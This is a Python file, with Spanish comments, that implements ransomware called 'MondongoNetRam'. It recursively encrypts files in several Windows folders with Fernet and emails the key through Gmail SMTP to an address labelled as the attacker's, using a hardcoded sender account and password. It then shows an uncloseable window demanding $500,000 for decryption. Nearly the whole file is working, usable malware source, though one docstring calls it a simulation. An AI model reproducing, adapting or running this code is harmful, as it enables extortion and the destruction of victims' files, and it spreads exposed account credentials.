from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import simpledialog, messagebox
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_key_via_email(key):
    """Envía la llave generada al correo del atacante."""
    attacker_email = "sigmathelast@gmail.com"  # Correo del atacante
    sender_email = "cufakeuno@gmail.com"  # Correo del remitente
    sender_password = "jfuo trpi eema uvbp"  # Contraseña del correo del remitente

    subject = "Llave de desencriptación"
    body = f"Llave generada: {key.decode()}"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = attacker_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, attacker_email, msg.as_string())
        print("Llave enviada exitosamente al correo del atacante.")
    except Exception as e:
        print(f"Error al enviar la llave por correo: {e}")

def create_ransom_note():
    """Devuelve las instrucciones de rescate."""
    amount = "$500,000"
    account = "123-456-789"
    return (
        
        f"Sus archivos han sido encriptados. Para desencriptarlos, transfiera {amount} a la cuenta {account} y "
        
        f"luego ingrese la llave de desencriptación proporcionada."
    )

def encrypt_file(file_path, key):
    """Encripta un archivo dado."""
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def decrypt_file(file_path, key):
    """Desencripta un archivo dado."""
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

def encrypt_folder(folder_path, key):
    """Encripta todos los archivos en una carpeta de forma recursiva."""
    if not os.path.exists(folder_path):
        return

    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path, key)
            except Exception:
                pass

def decrypt_folder(folder_path, key):
    """Desencripta todos los archivos en una carpeta de forma recursiva."""
    if not os.path.exists(folder_path):
        return

    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                decrypt_file(file_path, key)
            except Exception as e:
                print(f"Error al desencriptar '{file_path}': {e}")

def ransomware_window(key, folders_to_process):
    """Muestra una ventana que no puede cerrarse hasta que se introduzca la llave correcta."""
    def try_decrypt():
        user_key = entry_key.get()
        if user_key == key.decode():
            for folder_path in folders_to_process:
                decrypt_folder(folder_path, key)
            messagebox.showinfo("Éxito", "Archivos desencriptados correctamente.")
            root.destroy()
        else:
            messagebox.showerror("Error", "Llave incorrecta. Intente nuevamente.")

    root = tk.Tk()
    root.title("MondongoNetRam - Desencriptación requerida")
    root.geometry("400x300")
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Desactiva el cierre de la ventana

    instructions = create_ransom_note()

    label_instructions = tk.Label(root, text=instructions, wraplength=350, justify="left")
    label_instructions.pack(pady=20)

    label_entry = tk.Label(root, text="Ingrese la llave de desencriptación:")
    label_entry.pack(pady=5)

    entry_key = tk.Entry(root, show="*", width=40)
    entry_key.pack(pady=5)

    button_submit = tk.Button(root, text="Desencriptar", command=try_decrypt)
    button_submit.pack(pady=20)

    root.mainloop()

def ransomware_encrypt():
    """Simula un ransomware que encripta archivos en múltiples carpetas y envía la llave por correo."""
    folders_to_encrypt = [
        "C:\\Ataque",
        "C:\\Documentos",
        "C:\\Trabajo"
    ]

    # Generar una nueva clave de encriptación
    key = Fernet.generate_key()

    # Enviar la llave al correo del atacante
    send_key_via_email(key)

    # Encriptar las carpetas
    for folder_path in folders_to_encrypt:
        encrypt_folder(folder_path, key)

    # Mostrar la ventana de rescate
    ransomware_window(key, folders_to_encrypt)

if __name__ == "__main__":
    ransomware_encrypt()
